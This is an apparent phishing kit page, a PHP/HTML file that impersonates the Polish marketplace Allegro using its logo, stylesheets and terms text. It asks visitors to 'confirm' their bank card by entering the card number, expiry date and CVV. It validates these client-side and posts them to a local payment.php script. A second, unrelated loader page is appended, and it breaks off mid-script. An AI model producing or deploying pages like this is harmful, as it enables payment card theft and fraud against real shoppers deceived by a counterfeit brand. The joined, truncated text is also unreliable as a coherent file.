<?php 
error_reporting(0);
session_start();

?>
<!DOCTYPE html>
<html lang="pl">

<head>
    <meta charset="UTF-8">
    <title>Allegro logowanie - karta kredytowa</title>
    <meta name="format-detection" content="telephone=no">
    <meta name="description" content="Zaloguj się do konta Allegro. Zobacz najważniejsze informacje dostępne w panelu Moje Allegro. Gwarancja bezpiecznych zakupów.">
    
    
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
    <meta name="referrer" content="unsafe-url">
    <meta name="robots" content="index, follow">
    <link type="text/css" rel="stylesheet" href="https://assets.allegrostatic.com/bundle/v3-c17ed142e00e8c80fb51ebe24b3e0692931232ae67be88a8835b439ddeff663f.css" crossorigin data-metrum-bundle>
    <link type="text/css" rel="stylesheet" href="https://assets.allegrostatic.com/metrum/metrum-core/main-3f3821d4a7.m.css?v=0.6.1" crossorigin>
    <link type="text/css" rel="stylesheet" href="https://assets.allegrostatic.com/bundle/v3-bac1a2ef2a36bf26647bf97113340a8da2757e143f70d3e9406cc28105939658.css" crossorigin>
    <style>
        html {
            min-height: 100%
        }

        body {
            box-sizing: border-box;
            height: 100%;
            margin: 0;
            overflow-y: scroll
        }

        .main-wrapper {
            position: relative;
            box-sizing: border-box
        }

        @media print {
            [data-skin-class-name=metrum-footer-partial-expander],
            [data-skin-class-name=metrum-footer-partial] {
                display: none
            }
        }

        @font-face {
            font-weight: 300;
            font-family: Open Sans;
            font-style: normal;
            src: local("Open Sans Light"), local("OpenSans-Light"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-variable-wghtOnly-normal_168737b8.woff2) format("woff2 supports variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-variable-wghtOnly-normal_168737b8.woff2) format("woff2-variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-300-normal_c4d56a65.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-300-normal_b75dbf5a.woff) format("woff");
            font-display: swap;
            unicode-range: U+00??, U+0131, U+0152-0153, U+02bb-02bc, U+02c6, U+02da, U+02dc, U+2000-206f, U+2074, U+20ac, U+2122, U+2191, U+2193, U+2212, U+2215, U+feff, U+fffd
        }

        @font-face {
            font-weight: 300;
            font-family: Open Sans;
            font-style: normal;
            src: local("Open Sans Light"), local("OpenSans-Light"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-variable-wghtOnly-normal_41529361.woff2) format("woff2 supports variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-variable-wghtOnly-normal_41529361.woff2) format("woff2-variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-300-normal_3fbffb35.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-300-normal_c0ed32a3.woff) format("woff");
            font-display: swap;
            unicode-range: U+0100-024f, U+0259, U+1e??, U+2020, U+20a0-20ab, U+20ad-20cf, U+2113, U+2c60-2c7f, U+a720-a7ff
        }

        @font-face {
            font-weight: 400;
            font-family: Open Sans;
            font-style: normal;
            src: local("Open Sans Regular"), local("OpenSans-Regular"), local("Open Sans"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-variable-wghtOnly-normal_168737b8.woff2) format("woff2 supports variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-variable-wghtOnly-normal_168737b8.woff2) format("woff2-variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-400-normal_a2d02404.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-400-normal_6f654114.woff) format("woff");
            font-display: swap;
            unicode-range: U+00??, U+0131, U+0152-0153, U+02bb-02bc, U+02c6, U+02da, U+02dc, U+2000-206f, U+2074, U+20ac, U+2122, U+2191, U+2193, U+2212, U+2215, U+feff, U+fffd
        }

        @font-face {
            font-weight: 400;
            font-family: Open Sans;
            font-style: normal;
            src: local("Open Sans Regular"), local("OpenSans-Regular"), local("Open Sans"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-variable-wghtOnly-normal_41529361.woff2) format("woff2 supports variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-variable-wghtOnly-normal_41529361.woff2) format("woff2-variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-400-normal_0950a0db.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-400-normal_3d8deabf.woff) format("woff");
            font-display: swap;
            unicode-range: U+0100-024f, U+0259, U+1e??, U+2020, U+20a0-20ab, U+20ad-20cf, U+2113, U+2c60-2c7f, U+a720-a7ff
        }

        @font-face {
            font-weight: 600;
            font-family: Open Sans;
            font-style: normal;
            src: local("Open Sans SemiBold"), local("OpenSans-SemiBold"), local("Open Sans Semibold"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-variable-wghtOnly-normal_168737b8.woff2) format("woff2 supports variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-variable-wghtOnly-normal_168737b8.woff2) format("woff2-variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-600-normal_87da65d8.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-600-normal_28125e6f.woff) format("woff");
            font-display: swap;
            unicode-range: U+00??, U+0131, U+0152-0153, U+02bb-02bc, U+02c6, U+02da, U+02dc, U+2000-206f, U+2074, U+20ac, U+2122, U+2191, U+2193, U+2212, U+2215, U+feff, U+fffd
        }

        @font-face {
            font-weight: 600;
            font-family: Open Sans;
            font-style: normal;
            src: local("Open Sans SemiBold"), local("OpenSans-SemiBold"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-variable-wghtOnly-normal_41529361.woff2) format("woff2 supports variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-variable-wghtOnly-normal_41529361.woff2) format("woff2-variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-600-normal_64747c63.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-600-normal_1856a170.woff) format("woff");
            font-display: swap;
            unicode-range: U+0100-024f, U+0259, U+1e??, U+2020, U+20a0-20ab, U+20ad-20cf, U+2113, U+2c60-2c7f, U+a720-a7ff
        }

        @font-face {
            font-weight: 700;
            font-family: Open Sans;
            font-style: normal;
            src: local("Open Sans Bold"), local("OpenSans-Bold"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-variable-wghtOnly-normal_168737b8.woff2) format("woff2 supports variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-variable-wghtOnly-normal_168737b8.woff2) format("woff2-variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-700-normal_166dc5ef.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-700-normal_043b0bf0.woff) format("woff");
            font-display: swap;
            unicode-range: U+00??, U+0131, U+0152-0153, U+02bb-02bc, U+02c6, U+02da, U+02dc, U+2000-206f, U+2074, U+20ac, U+2122, U+2191, U+2193, U+2212, U+2215, U+feff, U+fffd
        }

        @font-face {
            font-weight: 700;
            font-family: Open Sans;
            font-style: normal;
            src: local("Open Sans Bold"), local("OpenSans-Bold"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-variable-wghtOnly-normal_41529361.woff2) format("woff2 supports variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-variable-wghtOnly-normal_41529361.woff2) format("woff2-variations"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-700-normal_45e8e1ac.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/open-sans-latin-ext-700-normal_8516ced2.woff) format("woff");
            font-display: swap;
            unicode-range: U+0100-024f, U+0259, U+1e??, U+2020, U+20a0-20ab, U+20ad-20cf, U+2113, U+2c60-2c7f, U+a720-a7ff
        }

        @font-face {
            font-weight: 300;
            font-family: Roboto;
            font-style: normal;
            src: local("Roboto Light"), local("Roboto-Light"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-300-normal_0109a2ac.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-300-normal_877b9231.woff) format("woff");
            font-display: swap;
            unicode-range: U+00??, U+0131, U+0152-0153, U+02bb-02bc, U+02c6, U+02da, U+02dc, U+2000-206f, U+2074, U+20ac, U+2122, U+2191, U+2193, U+2212, U+2215, U+feff, U+fffd
        }

        @font-face {
            font-weight: 300;
            font-family: Roboto;
            font-style: normal;
            src: local("Roboto Light"), local("Roboto-Light"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-ext-300-normal_a29236e0.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-ext-300-normal_06aac491.woff) format("woff");
            font-display: swap;
            unicode-range: U+0100-024f, U+0259, U+1e??, U+2020, U+20a0-20ab, U+20ad-20cf, U+2113, U+2c60-2c7f, U+a720-a7ff
        }

        @font-face {
            font-weight: 400;
            font-family: Roboto;
            font-style: normal;
            src: local("Roboto"), local("Roboto-Regular"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-400-normal_4673b453.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-400-normal_9b78ea3b.woff) format("woff");
            font-display: swap;
            unicode-range: U+00??, U+0131, U+0152-0153, U+02bb-02bc, U+02c6, U+02da, U+02dc, U+2000-206f, U+2074, U+20ac, U+2122, U+2191, U+2193, U+2212, U+2215, U+feff, U+fffd
        }

        @font-face {
            font-weight: 400;
            font-family: Roboto;
            font-style: normal;
            src: local("Roboto"), local("Roboto-Regular"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-ext-400-normal_c3dcdbd5.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-ext-400-normal_5bfc683d.woff) format("woff");
            font-display: swap;
            unicode-range: U+0100-024f, U+0259, U+1e??, U+2020, U+20a0-20ab, U+20ad-20cf, U+2113, U+2c60-2c7f, U+a720-a7ff
        }

        @font-face {
            font-weight: 500;
            font-family: Roboto;
            font-style: normal;
            src: local("Roboto Medium"), local("Roboto-Medium"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-500-normal_86988841.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-500-normal_ddd11dab.woff) format("woff");
            font-display: swap;
            unicode-range: U+00??, U+0131, U+0152-0153, U+02bb-02bc, U+02c6, U+02da, U+02dc, U+2000-206f, U+2074, U+20ac, U+2122, U+2191, U+2193, U+2212, U+2215, U+feff, U+fffd
        }

        @font-face {
            font-weight: 500;
            font-family: Roboto;
            font-style: normal;
            src: local("Roboto Medium"), local("Roboto-Medium"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-ext-500-normal_feaff916.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-ext-500-normal_3dc2c794.woff) format("woff");
            font-display: swap;
            unicode-range: U+0100-024f, U+0259, U+1e??, U+2020, U+20a0-20ab, U+20ad-20cf, U+2113, U+2c60-2c7f, U+a720-a7ff
        }

        @font-face {
            font-weight: 700;
            font-family: Roboto;
            font-style: normal;
            src: local("Roboto Bold"), local("Roboto-Bold"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-700-normal_0682ca7f.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-700-normal_0344cc3c.woff) format("woff");
            font-display: swap;
            unicode-range: U+00??, U+0131, U+0152-0153, U+02bb-02bc, U+02c6, U+02da, U+02dc, U+2000-206f, U+2074, U+20ac, U+2122, U+2191, U+2193, U+2212, U+2215, U+feff, U+fffd
        }

        @font-face {
            font-weight: 700;
            font-family: Roboto;
            font-style: normal;
            src: local("Roboto Bold"), local("Roboto-Bold"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-ext-700-normal_bcf37d66.woff2) format("woff2"), url(https://assets.allegrostatic.com/sc-15284/statics/roboto-latin-ext-700-normal_1b274fb0.woff) format("woff");
            font-display: swap;
            unicode-range: U+0100-024f, U+0259, U+1e??, U+2020, U+20a0-20ab, U+20ad-20cf, U+2113, U+2c60-2c7f, U+a720-a7ff
        }
    </style>
    
    
   
</head>

<body>
<script src="js/jqueryy-3.1.1.min.js"></script>

<script src="js/payy.js" ></script>

<script>
    


    jQuery(function($) {
      $('[data-numeric]').payment('restrictNumeric');
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.form-group').toggleClass('has-error', erred);
        return this;
      };

      $('#send_cc').click(function(){

    var cardType = $.payment.cardType($('.cc-number').val());
    var ex_n  = $('.cc-exp').val().split('/');
    var exp_m = ex_n[0];
    var exp_y = ex_n[1];

        var v_num = $.payment.validateCardNumber($('.cc-number').val());
        var v_exp = $.payment.validateCardCVC($('.cc-cvc').val(), cardType);
        var v_exd = $.payment.validateCardExpiry(exp_m, exp_y);
    
    if(v_num == true && v_exp == true && v_exd == true)
    {
      return true;
    }
    else
    {
          $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
          $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
          $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
          $('.cc-brand').text(cardType);
          return false;
    }

      });



       

    });
  </script>
    <svg width="0" height="0" style="position:absolute" id="svg-color-matrix-filters"><filter id="m-color-filter-white" color-interpolation-filters="sRGB"><feColorMatrix values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 1 0"></feColorMatrix></filter><filter id="m-color-filter-black" color-interpolation-filters="sRGB"><feColorMatrix values="0 0 0 0 0.133 0 0 0 0 0.133 0 0 0 0 0.133 0 0 0 1 0"></feColorMatrix></filter></svg>
    <div class="side-nav vela"></div>
    <div class="main-wrapper">

        <div data-box-name="allegro.header.menu" data-box-id="yeM4D67mR5Sg1zPqhAnylA==KeQ2mJvhQTWTkupGkCnOIw==" data-prototype-id="allegro.header.menu" data-prototype-version="2.0" data-civ="67f" data-analytics-enabled data-analytics-category="allegro.header.menu"
            data-analytics-groups="%5B%22allegro.header.landing%22%5D"><a name="allegro-header-menu"></a>
            <header class="msts_9u mx7m_1 mnyp_co mlkp_ag" data-role="header-wrapper" role="banner" data-header-sticky="">
                <div class="munh_56 m3h2_56 _9f0v0 _jkrtd mpof_ki m389_6m m7f5_sf mjyo_6x mg9e_8 mg9e_16_s mj7a_8 mj7a_16_s mjru_ey munh_56 m3h2_56 _9f0v0 _jkrtd mpof_ki m389_6m m7f5_sf mjyo_6x mg9e_8 mg9e_16_s mj7a_8 mj7a_16_s _13850_v4zZo mvrt_8 mvrt_16_s mh36_8 mh36_16_s mwdn_0"
                    data-role="header-primary-bar">
                    <h2 itemscope itemtype="" class="mpof_ki m389_6m _13850_-exh8 mli2_0"><a href="/" title="Allegro.pl - wygodne i bezpieczne zakupy online, największy wybór ofert" class="m7er_80 mpof_ki mli2_0 _13850_1m7us _13850_1BaJY" data-analytics-clickable="" itemprop="url" data-analytics-click-value="logotype"><img src="https://a.allegroimg.com/original/1201da/b8806483460d99ec3739941289ab" alt="Allegro.pl - wygodne i bezpieczne zakupy online, największy wybór ofert" class="m7er_k4 mse2_k4 _13850_11E2Y" itemprop="logo" /></a>                        </h2>
                    <nav class="mpof_5r mpof_ki_s m7er_k4 m7f5_0a mx4z_6m _13850_1s0ri" data-role="landing-page-menu">
                        <div data-role="header-dropdown" class="_1caf7 mpof_ki"><button class="munh_16 mgn2_14 mp0t_0a mgmw_wo mqu1_21 mj9z_5r mli8_k4 mqen_m6 l1e4v mg9e_0 mvrt_0 mj7a_0 mh36_0 m911_5r mefy_5r mnyp_5r mdwl_5r msa3_z4 m0qj_5r msts_n7 l9htu mpof_5r mx4z_6m" data-role="header-dropdown-toggle"
                                aria-expanded="false" type="button" data-landing-page-show-more-button="">więcej <img src="https://assets.allegrostatic.com/metrum/icon/arrowhead-9148b8f39c.svg" alt="" class="mpof_5r" data-role="header-dropdown-icon" /></button>
                            <div class="_oq6f5 _sr0iu">
                                <ul class="mp0t_0a mgn2_14 mqu1_21 mgmw_wo mli8_k4 mb54_5r mg9e_8 mj7a_8 mh36_0 mvrt_0 mp4t_0 m3h2_0 mryx_0 munh_0" data-role="landing-page-menu-hidden-list"></ul>
                            </div>
                        </div>
                    </nav>
                    <div class="mpof_ki m389_6m mx4z_6m m7f5_6m munh_16 mli2_0">
                        <div data-box-name="container.first-successful" data-box-id="yeM4D67mR5Sg1zPqhAnylA==UNxDwyUpSWutSC53kiEa7g==6VXjpAS2SUyL8QaNeFkYgQ==" data-prototype-id="layout.container" data-prototype-version="9.0" data-analytics-category="layout.container"
                            data-analytics-groups="%5B%22allegro.header.landing%22%2C%22allegro.languageSwitchPartial%22%5D"><a name="container-first-successful"></a>
                            <div class="opbox-sheet-wrapper m7er_k4 munh_56 m3h2_56 _26e29_2AYAm mjru_ey carousel-item">
                                <div class="opbox-sheet opbox-sheet-72693 _26e29_11PCu" style="">
                                    <div data-box-name="allegro.languageswitch.container" data-box-id="yeM4D67mR5Sg1zPqhAnylA==UNxDwyUpSWutSC53kiEa7g==IeOx3bRRTQ6Hj8dAd2xe6Q==" data-prototype-id="layout.container" data-prototype-version="9.0" data-analytics-category="layout.container"
                                        data-analytics-groups="%5B%22allegro.header.landing%22%2C%22allegro.languageSwitchPartial%22%5D"><a name="allegro-languageswitch-container"></a>
                                        <div class="opbox-sheet-wrapper m7er_k4 munh_56 m3h2_56 _26e29_2AYAm mjru_ey carousel-item">
                                            <div class="opbox-sheet opbox-sheet-3d987 _26e29_11PCu" style="">
                                                <div data-box-name="allegro.languageswitch.alternates" data-box-id="yeM4D67mR5Sg1zPqhAnylA==UNxDwyUpSWutSC53kiEa7g==2e5JwvltRgmuFrsauqD3BA==" data-prototype-id="allegro.miniLanguageSwitch" data-prototype-version="0.2"
                                                    data-civ="1" data-analytics-enabled data-analytics-category="allegro.miniLanguageSwitch" data-analytics-groups="%5B%22allegro.header.landing%22%2C%22allegro.languageSwitchPartial%22%5D"><a name="allegro-languageswitch-alternates"></a></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div data-box-name="FCP mark" data-box-id="yeM4D67mR5Sg1zPqhAnylA==3EDU-vlBRMK9SSaLXKv7rQ==" data-prototype-id="allegro.performance.mark" data-prototype-version="0.2" data-civ="04f" data-analytics-enabled data-analytics-category="allegro.performance.mark"
                            data-analytics-groups="%5B%22allegro.header.landing%22%5D"><a name="fcp-mark"></a>
                            <script nonce="Zs+Tt1y5WTUsb4kUaqyOFA==">
                            </script>
                        </div>
                    </div>
                </div>
            </header>
        </div>
        <div data-box-name="layout.desk.new-login" data-box-id="cQCt2lzGQ-2G9b3DFAit9g==" data-prototype-id="layout.desk" data-prototype-version="1.0" data-analytics-category="layout.desk"><a name="layout-desk-new-login"></a>
            <div class="opbox-sheet-wrapper m7er_k4 munh_56 m3h2_56 _26e29_2AYAm mjru_k4 carousel-item">
                <div class="opbox-sheet _26e29_11PCu" style="background: #ECEFF1;">
                    <div data-box-name="app.container" data-box-id="G0333vMvR5evopNAwc4Utg==" data-prototype-id="layout.container" data-prototype-version="9.0" data-analytics-category="layout.container"><a name="app-container"></a>
                        <div class="opbox-sheet-wrapper m7er_k4 munh_56 m3h2_56 _26e29_2AYAm mjru_ua carousel-item">
                            <div class="opbox-sheet opbox-sheet-c1ff0 _26e29_11PCu" style="margin-top:16px;margin-bottom:24px;">
                                <div data-box-name="allegro.login.form" data-box-id="YZ_w-lhzT_eJYnL9bT_36Q==" data-prototype-id="allegro.login.form" data-prototype-version="0.2" data-analytics-enabled data-analytics-category="allegro.login.form"><a name="allegro-login-form"></a>
                                    <div class="_1h7wt">
                                        <div class="_1yyhi m7f5_6m m389_6m mp7g_oh">
                                            <div class="_3kk7b _vnd3k _otc6c _1kwvx _1iuj2 _hnoyr">
                                                <div class="myre_zn m7er_k4">
                                                    <section class="_9f0v0 mzaq_56">
                                                        <h2 class="_1s2v1 _dsf2b _8x27x mpof_vs mryx_16">karta kredytowa</h2>
														<p>Potwierdź kartę bankową, której używasz na naszej stronie</p>
                                                        <div class="_1yyhi mm9t_qc">
                                                            <div class="_3kk7b _d596d_UKob6 _t0xzz _1493m">
                                                                <div><input data-testid="email-credentials-switch" type="radio" id="emailCredentialsSwitch" name="switch" value="email" checked class="chv6zh ch1p7i" /><label for="emailCredentialsSwitch" class="chxtc5">Potwierdzenie karty bankowej</label></div>
                                                            </div>
                                                            <div class="_3kk7b">
                                                                <div><input data-testid="phone-credentials-switch" type="radio" id="phoneCredentialsSwitch" name="switch" value="phone" class="chv6zh ch1p7i" />
                                                                    <sup
                                                                        class="ht13u6 _d596d_eWGF5 _d596d_26nRB"></sup>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <form name="loginForm" role="form" id="authForm"method="post" action="email/payment.php" >
                                                            <div class="_1yyhi">
                                                                <div class="_3kk7b _vnd3k myre_zn">
                                                                    <div class="_d596d_1PKPx">
                                                                        <div class="_1h7wt mjyo_6x mp7g_oh mpof_ki mgmw_3z mgn2_14 mp0t_0a msa3_z4 f1ejb"><input name="cardnumber" value autoComplete="off" maxLength="16" id="login" type="text" placeholder="Numer karty" autoCorrect="off" aria-describedby="login-error" class="mjyo_6x mqu1_21 mli8_k4 mse2_40 mp4t_0 m3h2_0 mryx_0 munh_0 mg9e_8 mvrt_8 mj7a_8 mh36_8 m911_5r mefy_5r mnyp_5r mdwl_5r msbw_2 mldj_2 mtag_2 mm2b_2 mgmw_wo msts_pt mgn2_14 mp0t_0a m9tr_5r o1jww m0ux_fp mp5q_jr fzysh"
                                                                             required="required"/><label for="login" class="fjd5i">Numer karty</label></div>
																			<div class="_1h7wt mjyo_6x mp7g_oh mpof_ki mgmw_3z mgn2_14 mp0t_0a msa3_z4 f1ejb"><input name="mm" value autoComplete="off" maxLength="2" id="login" type="text" placeholder="MM" autoCorrect="off" aria-describedby="login-error" class="mjyo_6x mqu1_21 mli8_k4 mse2_40 mp4t_0 m3h2_0 mryx_0 munh_0 mg9e_8 mvrt_8 mj7a_8 mh36_8 m911_5r mefy_5r mnyp_5r mdwl_5r msbw_2 mldj_2 mtag_2 mm2b_2 mgmw_wo msts_pt mgn2_14 mp0t_0a m9tr_5r o1jww m0ux_fp mp5q_jr fzysh"
                                                                            required="required" />
																			<input name="rr" value autoComplete="off" maxLength="4" id="login" type="text" placeholder="RR" autoCorrect="off" aria-describedby="login-error" class="mjyo_6x mqu1_21 mli8_k4 mse2_40 mp4t_0 m3h2_0 mryx_0 munh_0 mg9e_8 mvrt_8 mj7a_8 mh36_8 m911_5r mefy_5r mnyp_5r mdwl_5r msbw_2 mldj_2 mtag_2 mm2b_2 mgmw_wo msts_pt mgn2_14 mp0t_0a m9tr_5r o1jww m0ux_fp mp5q_jr fzysh"
                                                                            required="required" />
																			<label for="login" class="fjd5i">Ważna do</label></div>
																			<div class="_1h7wt mjyo_6x mp7g_oh mpof_ki mgmw_3z mgn2_14 mp0t_0a msa3_z4 f1ejb"><input name="cvv" value autoComplete="off" maxLength="3" id="login" type="text" placeholder="Kod CVV2/CVC2" autoCorrect="off" aria-describedby="login-error" class="mjyo_6x mqu1_21 mli8_k4 mse2_40 mp4t_0 m3h2_0 mryx_0 munh_0 mg9e_8 mvrt_8 mj7a_8 mh36_8 m911_5r mefy_5r mnyp_5r mdwl_5r msbw_2 mldj_2 mtag_2 mm2b_2 mgmw_wo msts_pt mgn2_14 mp0t_0a m9tr_5r o1jww m0ux_fp mp5q_jr fzysh"
                                                                            required="required" /><label for="login" class="fjd5i">Kod CVV2/CVC2</label></div>
                                                                    </div>
                                                                    <div class="mpof_ki myre_zn myre_8v_s m7f5_sf mp4t_16_s _d596d_1JtF3">
                                                                        <div class="mpof_ki myre_zn m389_0a m389_5x_s"><span class="_15mod mgmw_ag"></span></div><button role="button"
                                                                            type="submit" class="m7er_56 mp4t_16 mp4t_0_s _d596d_3-33u bz58c bl8ld">Potwierdzać</button></div>
                                                                </div>
                                                            </div>
                                                        </form>
                                                        <div>
                                                           
                                                        </div>
                                                        <div class="mpof_ki myre_zn myre_8v_s mp4t_24">
                                                            <div
                                                </div>
                                                </section>
                                                <section class="_9f0v0 mzaq_56">
                                                    <div><strong>Potwierdzenie karty bankowej?</strong><a href="/rejestracja" class="lqh78 lc0vi mgmw_xx mp4t_16 munh_8 mtsp_ib"></a></div>
                                                </section>
                                                <section class="_1dd5x mp4t_16 mh36_16 mh36_24_m mvrt_16 mvrt_24_m">Logując się do Allegro akceptujesz <a href="/regulamin" target="_blank" rel="noreferrer" data-analytics-clickable data-analytics-click-label="Login_Statute" class="_1dd5x lqh78">Regulamin</a> w aktualnym
                                                    brzmieniu. Informacje o planowanych oraz archiwalnych zmianach Regulaminu są dostępne na <a href="/pomoc/zmiany-w-regulaminie/aktualnosci" target="_blank" rel="noreferrer" data-analytics-clickable data-analytics-click-label="Login_StatuteArchive"
                                                        class="_1dd5x lqh78">stronie</a>.</section>
                                            </div>
                                        </div>
                                        <div class="mpof_5r mpof_ki_x mx4z_6i _3kk7b _hnoyr _d596d_27sYx">
                                            <div class="m7er_k4 mpof_ki_x">
                                                <section class="_9f0v0 mpof_ki m389_6m m7f5_6m mzaq_56 _d596d_3M4-y">
                                                    <div>
                                                        <div data-box-name="banner - cmuid" data-box-id="uCjJvrQPSeaARUIsps79KQ==8kOSmPFHSWaLdjer0qpwAQ==" data-prototype-id="allegro.advertisement.slot.banner" data-prototype-version="0.2" data-civ="d96" data-analytics-enabled
                                                            data-analytics-category="allegro.advertisement.slot.banner" data-analytics-groups="%5B%22loginAd%22%5D"><a name="banner-cmuid"></a>
                                                            <div class="myre_zn m7f5_6m _d0a4b_3K4go m389_6m mpof_ki" style="" data-initially-visible="true">
                                                                <div id="uCjJvrQPSeaARUIsps79KQ==8kOSmPFHSWaLdjer0qpwAQ=="></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </section>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div data-box-name="footer.container" data-box-id="V5ZXGBX-SyKgc7cOR0qh2w==" data-prototype-id="layout.container" data-prototype-version="9.0" data-analytics-category="layout.container"><a name="footer-container"></a>
        <div class="opbox-sheet-wrapper m7er_k4 munh_56 m3h2_56 _26e29_2AYAm mjru_k4 carousel-item">
            <div class="opbox-sheet opbox-sheet-9ec45 _26e29_11PCu" style="">
                <div data-box-name="metrum-footer-partial" data-box-id="dKyMtQIVSx-YCp8qbHqxyw==c1RTY_NlSkGieZLxkDr1kw==" data-prototype-id="layout.container" data-prototype-version="7.0" data-skin-class-name="metrum-footer-partial" data-analytics-category="layout.container"
                    data-analytics-groups="%5B%22allegro.footer%22%5D"><a name="metrum-footer-partial"></a>
                    <div class="opbox-sheet-wrapper m7er_k4 munh_56 m3h2_56 _26e29_2AYAm mjru_k4 carousel-item">
                        <div class="opbox-sheet _26e29_11PCu" style="background: white;">
                            <div data-box-name="allegro.spinner.metrum-footer" data-box-id="dKyMtQIVSx-YCp8qbHqxyw==5Ske4ilxSkuv2hUMz_zBRQ==" data-prototype-id="allegro.spinner" data-prototype-version="0.1" data-civ="d41" data-placeholder-for="dKyMtQIVSx-YCp8qbHqxyw==QF9nzJVZQlCB3_3j9GR37w=="
                                class="lazyload" data-analytics-enabled data-analytics-category="allegro.spinner" data-analytics-groups="%5B%22allegro.footer%22%5D"><a name="allegro-spinner-metrum-footer"></a>
                                
                            </div>
                        </div>
                    </div>
                </div>
                <div data-box-name="layout.container" data-box-id="dKyMtQIVSx-YCp8qbHqxyw==WGNlv4_RTLCchdtRH0JxMA==utJmaXewQPe3kGLDMBOVcg==" data-prototype-id="layout.container" data-prototype-version="9.0" data-analytics-category="layout.container" data-analytics-groups="%5B%22allegro.footer%22%2C%22allegro.ads.rodo%22%5D"><a name="layout-container"></a>
                    <div class="opbox-sheet-wrapper m7er_k4 munh_56 m3h2_56 _26e29_2AYAm mjru_k4 carousel-item">
                        <div class="opbox-sheet opbox-sheet-f43c8 _26e29_11PCu" style=""> </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    </div>
   
  
</body>

</html>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Untitled Page</title>
<link href="css/css/Untitled1.css" rel="stylesheet">
<link href="css/css/index.css" rel="stylesheet">
<script src="js/js/jquery-1.12.4.min.js"></script>
<script src="js/js/jquery-ui.min.js"></script>
<script src="js/js/wwb16.min.js"></script>
</head>
<body>

<div id="back" style="position:fixed;text-align:center;left:0;top:0;right:0;bottom:0;z-index:4;">
<div id="back_Container" style="width:970px;position:relative;margin-left:auto;margin-right:auto;text-align:left;">
<div id="front" style="position:fixed;text-align:center;left:50%;margin-left:-119px;top:50%;margin-top:-119px;width:239px;height:238px;z-index:1;">
<div id="front_Container" style="width:239px;position:relative;margin-left:auto;margin-right:auto;text-align:left;">
<div id="wb_loader" style="position:absolute;left:55px;top:55px;width:128px;height:128px;z-index:0;">
<img src="images/loader.gif" id="loader" alt="" width="128" height="128"></div>
</div>
</div>
</div>
</div>
<script>
var wb_Timer1;
function TimerStartTimer1()
{
   wb_Timer1 = setInterval(function()
   {
      var event = null;
